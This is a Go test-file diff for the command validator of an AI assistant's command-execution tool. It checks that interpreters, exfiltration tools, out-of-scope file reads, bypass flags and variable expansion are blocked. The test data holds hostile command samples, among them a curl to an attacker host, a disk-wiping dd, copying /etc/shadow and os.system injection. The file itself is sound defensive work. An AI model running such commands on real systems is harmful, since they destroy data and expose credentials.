@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -23,7 +24,7 @@ func TestExecuteBashCommandTool_Interface(t *testing.T) {
 	config := &schema.AtmosConfiguration{BasePath: "/tmp/atmos"}
 	tool := NewExecuteBashCommandTool(config)
 
-	assert.Equal(t, "execute_bash_command", tool.Name())
+	assert.Equal(t, "execute_direct_command", tool.Name())
 	assert.NotEmpty(t, tool.Description())
 	assert.True(t, tool.RequiresPermission())
 	assert.False(t, tool.IsRestricted())
@@ -39,7 +40,7 @@ func TestExecuteBashCommandTool_Interface(t *testing.T) {
 func TestExecuteBashCommandTool_Description_NoShell(t *testing.T) {
 	tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{})
 	desc := tool.Description()
-	assert.Contains(t, desc, "without a shell", "description must communicate direct (non-shell) execution")
+	assert.Contains(t, desc, "no shell", "description must communicate direct (non-shell) execution")
 }
 
 // ---------------------------------------------------------------------------
@@ -586,7 +587,7 @@ func TestValidateCommand_NotAllowed(t *testing.T) {
 	unlisted := []string{"openssl", "ssh", "nmap", "bash", "sh", "zsh", "dd", "mkfs", "kill", "shutdown"}
 	for _, cmd := range unlisted {
 		t.Run(cmd, func(t *testing.T) {
-			result := validateCommand([]string{cmd, "arg"}, cmd+" arg")
+			result := validateCommand([]string{cmd, "arg"}, cmd+" arg", allowedCommands, blacklistedCommands)
 			require.NotNil(t, result, "unlisted command %q must be blocked", cmd)
 			assert.False(t, result.Success)
 			assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandNotAllowed),
@@ -596,14 +597,16 @@ func TestValidateCommand_NotAllowed(t *testing.T) {
 }
 
 // TestValidateCommand_Blacklist confirms that the blacklist defense-in-depth path
-// is reachable when a command is in both allowedCommands and blacklistedCommands.
-// We temporarily add "dd" to allowedCommands to exercise this branch.
+// is reachable when a command is in both allowedCmds and blockedCmds.
+// A custom allowed map is passed directly so no global state is mutated.
 func TestValidateCommand_Blacklist(t *testing.T) {
-	origAllowed := allowedCommands["dd"]
-	allowedCommands["dd"] = true
-	t.Cleanup(func() { allowedCommands["dd"] = origAllowed })
-
-	result := validateCommand([]string{"dd", "if=/dev/zero", "of=/dev/sda"}, "dd if=/dev/zero of=/dev/sda")
+	customAllowed := map[string]bool{"dd": true}
+	result := validateCommand(
+		[]string{"dd", "if=/dev/zero", "of=/dev/sda"},
+		"dd if=/dev/zero of=/dev/sda",
+		customAllowed,
+		blacklistedCommands,
+	)
 	require.NotNil(t, result)
 	assert.False(t, result.Success)
 	assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandBlacklisted),
@@ -629,7 +632,7 @@ func TestValidateCommand_RmRecursiveFlag(t *testing.T) {
 	}
 	for _, tc := range dangerous {
 		t.Run(tc.name, func(t *testing.T) {
-			result := validateCommand(tc.args, "rm "+tc.name)
+			result := validateCommand(tc.args, "rm "+tc.name, allowedCommands, blacklistedCommands)
 			require.NotNil(t, result, "dangerous rm must be blocked: %v", tc.args)
 			assert.False(t, result.Success)
 			assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandRmNotAllowed),
@@ -648,7 +651,7 @@ func TestValidateCommand_RmRecursiveFlag(t *testing.T) {
 	}
 	for _, tc := range safe {
 		t.Run("safe "+tc.name, func(t *testing.T) {
-			result := validateCommand(tc.args, "rm "+tc.name)
+			result := validateCommand(tc.args, "rm "+tc.name, allowedCommands, blacklistedCommands)
 			assert.Nil(t, result, "safe rm should not be blocked: %v", tc.args)
 		})
 	}
@@ -716,4 +719,244 @@ func TestExecuteBashCommandTool_Execute_WorkingDirOutsideBasePathFallsBack(t *te
 	require.True(t, result.Success)
 	// The actual working directory used must be the base path (dir), not /etc.
 	assert.Equal(t, dir, result.Data["working_dir"])
+}
+
+// ---------------------------------------------------------------------------
+// Interpreter / exfiltration command tests (commands removed from allow-list)
+// ---------------------------------------------------------------------------
+
+// TestExecuteBashCommandTool_Execute_InterpreterCommandsBlocked verifies that
+// interpreter and exfiltration binaries removed from allowedCommands are
+// rejected with ErrAICommandNotAllowed.
+func TestExecuteBashCommandTool_Execute_InterpreterCommandsBlocked(t *testing.T) {
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: "/tmp"})
+cases := []string{
+"python3 -c 'import os; os.system(\"id\")'",
+"awk 'BEGIN{system(\"id\")}'",
+"curl https://attacker.com",
+"env",
+"python script.py",
+"node script.js",
+"sed -i s/foo/bar/ file.txt",
+"wget https://example.com",
+"make all",
+}
+for _, cmd := range cases {
+t.Run(cmd, func(t *testing.T) {
+result, err := tool.Execute(context.Background(), map[string]interface{}{"command": cmd})
+assert.NoError(t, err, "cmd=%q", cmd)
+assert.False(t, result.Success, "should be blocked: %q", cmd)
+require.Error(t, result.Error, "cmd=%q", cmd)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandNotAllowed),
+"cmd=%q: expected ErrAICommandNotAllowed, got: %v", cmd, result.Error)
+})
+}
+}
+
+// ---------------------------------------------------------------------------
+// Source path validation tests
+// ---------------------------------------------------------------------------
+
+// TestExecuteBashCommandTool_Execute_SourcePathsBlocked verifies that read-type
+// commands (cp, mv, cat, head, tail, diff, grep) cannot access paths outside the
+// base path or the OS temporary directory.
+func TestExecuteBashCommandTool_Execute_SourcePathsBlocked(t *testing.T) {
+if runtime.GOOS == "windows" {
+t.Skip("Skipping on Windows")
+}
+// Use a dedicated temp subdirectory as basePath so /etc is out-of-scope.
+dir := t.TempDir()
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: dir})
+
+cases := []string{
+"cp /etc/shadow /tmp/leak.txt",
+"cat /etc/passwd",
+"grep root /etc/shadow",
+"head /etc/passwd",
+"tail /etc/passwd",
+"diff /etc/passwd /etc/shadow",
+"mv /etc/hosts /tmp/hosts.bak",
+}
+for _, cmd := range cases {
+t.Run(cmd, func(t *testing.T) {
+result, err := tool.Execute(context.Background(), map[string]interface{}{"command": cmd})
+assert.NoError(t, err, "cmd=%q", cmd)
+assert.False(t, result.Success, "should be blocked: %q", cmd)
+require.Error(t, result.Error, "cmd=%q", cmd)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandPathNotAllowed),
+"cmd=%q: expected ErrAICommandPathNotAllowed, got: %v", cmd, result.Error)
+})
+}
+}
+
+// TestExecuteBashCommandTool_Execute_SourcePathsAllowed verifies that read-type
+// commands are permitted when all path arguments are within the base path.
+func TestExecuteBashCommandTool_Execute_SourcePathsAllowed(t *testing.T) {
+if runtime.GOOS == "windows" {
+t.Skip("Skipping on Windows")
+}
+dir := t.TempDir()
+// Create a test file to read.
+target := filepath.Join(dir, "readme.txt")
+require.NoError(t, os.WriteFile(target, []byte("hello\n"), 0o600))
+
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: dir})
+result, err := tool.Execute(context.Background(), map[string]interface{}{
+"command": "cat " + target,
+})
+require.NoError(t, err)
+require.True(t, result.Success, "cat of in-scope file must succeed (exit=%v): %v", result.Data["exit_code"], result.Error)
+assert.Contains(t, result.Output, "hello")
+}
+
+// ---------------------------------------------------------------------------
+// Interpreter bypass flag tests
+// ---------------------------------------------------------------------------
+
+// TestExecuteBashCommandTool_Execute_BypassFlagsBlocked verifies that interpreter
+// bypass flags (-c, --eval, -e, --exec) are rejected for build/package tools.
+func TestExecuteBashCommandTool_Execute_BypassFlagsBlocked(t *testing.T) {
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: "/tmp"})
+cases := []string{
+"npm --exec id",
+"npm -c ls",
+"yarn --exec id",
+"pip -e /some/path",
+"pip3 --exec id",
+}
+for _, cmd := range cases {
+t.Run(cmd, func(t *testing.T) {
+result, err := tool.Execute(context.Background(), map[string]interface{}{"command": cmd})
+assert.NoError(t, err, "cmd=%q", cmd)
+assert.False(t, result.Success, "should be blocked: %q", cmd)
+require.Error(t, result.Error, "cmd=%q", cmd)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandBlacklisted),
+"cmd=%q: expected ErrAICommandBlacklisted, got: %v", cmd, result.Error)
+})
+}
+}
+
+// TestExecuteBashCommandTool_Execute_GoRunStdinBlocked verifies that "go run -"
+// (stdin execution) is rejected.
+func TestExecuteBashCommandTool_Execute_GoRunStdinBlocked(t *testing.T) {
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: "/tmp"})
+result, err := tool.Execute(context.Background(), map[string]interface{}{
+"command": "go run -",
+})
+assert.NoError(t, err)
+assert.False(t, result.Success)
+require.Error(t, result.Error)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandBlacklisted),
+"go run stdin must be blocked: %v", result.Error)
+}
+
+// ---------------------------------------------------------------------------
+// Execution timeout test
+// ---------------------------------------------------------------------------
+
+// TestExecuteBashCommandTool_Execute_Timeout verifies that the internal command
+// timeout kills a long-running process and returns Success=false.
+func TestExecuteBashCommandTool_Execute_Timeout(t *testing.T) {
+if runtime.GOOS == "windows" {
+t.Skip("Skipping on Windows")
+}
+dir := t.TempDir()
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: dir})
+// Shorten the timeout so the test completes in ~1 second instead of 30.
+tool.commandTimeout = 1 * time.Second
+
+start := time.Now()
+result, err := tool.Execute(context.Background(), map[string]interface{}{
+"command": "sleep 60",
+})
+elapsed := time.Since(start)
+
+assert.NoError(t, err, "Execute must not return a Go error on timeout")
+assert.False(t, result.Success, "timed-out command should not succeed")
+assert.Error(t, result.Error)
+// The command should be killed well within 5 seconds.
+assert.Less(t, elapsed, 5*time.Second, "timed-out command should complete quickly; elapsed=%v", elapsed)
+}
+
+// ---------------------------------------------------------------------------
+// Unquoted $VAR detection tests
+// ---------------------------------------------------------------------------
+
+// TestExecuteBashCommandTool_Execute_UnquotedDollarBlocked verifies that commands
+// containing unquoted environment variable references are rejected.
+func TestExecuteBashCommandTool_Execute_UnquotedDollarBlocked(t *testing.T) {
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: "/tmp"})
+cases := []string{
+"echo $HOME",
+"grep $PATTERN file.txt",
+`echo "price is $5"`,
+"ls $PWD",
+}
+for _, cmd := range cases {
+t.Run(cmd, func(t *testing.T) {
+result, err := tool.Execute(context.Background(), map[string]interface{}{"command": cmd})
+assert.NoError(t, err, "cmd=%q", cmd)
+assert.False(t, result.Success, "should be blocked: %q", cmd)
+require.Error(t, result.Error, "cmd=%q", cmd)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandVarExpansion),
+"cmd=%q: expected ErrAICommandVarExpansion, got: %v", cmd, result.Error)
+})
+}
+}
+
+// TestExecuteBashCommandTool_Execute_SingleQuotedDollarAllowed verifies that '$'
+// inside single quotes is treated as a literal character and does not block the
+// command.
+func TestExecuteBashCommandTool_Execute_SingleQuotedDollarAllowed(t *testing.T) {
+if runtime.GOOS == "windows" {
+t.Skip("Skipping on Windows")
+}
+tool := NewExecuteBashCommandTool(&schema.AtmosConfiguration{BasePath: "/tmp"})
+result, err := tool.Execute(context.Background(), map[string]interface{}{
+"command": "echo 'hello $world'",
+})
+require.NoError(t, err)
+require.True(t, result.Success, "single-quoted $ should not be blocked (exit=%v): %v", result.Data["exit_code"], result.Error)
+assert.Contains(t, result.Output, "$world", "single-quoted $ must pass through as literal")
+}
+
+// TestContainsUnquotedDollar exercises containsUnquotedDollar directly.
+func TestContainsUnquotedDollar(t *testing.T) {
+mustBlock := []string{
+"echo $HOME",
+"ls $PWD",
+`echo "price $5"`,
+"grep $PATTERN file",
+}
+for _, s := range mustBlock {
+assert.True(t, containsUnquotedDollar(s), "should detect unquoted $ in %q", s)
+}
+
+mustAllow := []string{
+"echo hello",
+"echo 'hello $world'",
+"git commit -m 'cost is $5'",
+"grep pattern file.txt",
+}
+for _, s := range mustAllow {
+assert.False(t, containsUnquotedDollar(s), "should NOT detect unquoted $ in %q", s)
+}
+}
+
+// ---------------------------------------------------------------------------
+// validateCommand with custom maps (unit-test isolation)
+// ---------------------------------------------------------------------------
+
+// TestValidateCommand_WithCustomAllowed exercises validateCommand in isolation
+// using caller-supplied allow/block maps, confirming the function is stateless.
+func TestValidateCommand_WithCustomAllowed(t *testing.T) {
+customAllowed := map[string]bool{"testcmd": true}
+customBlocked := map[string]bool{}
+
+result := validateCommand([]string{"testcmd", "arg"}, "testcmd arg", customAllowed, customBlocked)
+assert.Nil(t, result, "command in custom allow-list should not be blocked")
+
+result = validateCommand([]string{"notallowed"}, "notallowed", customAllowed, customBlocked)
+require.NotNil(t, result)
+assert.True(t, errors.Is(result.Error, errUtils.ErrAICommandNotAllowed))
 }
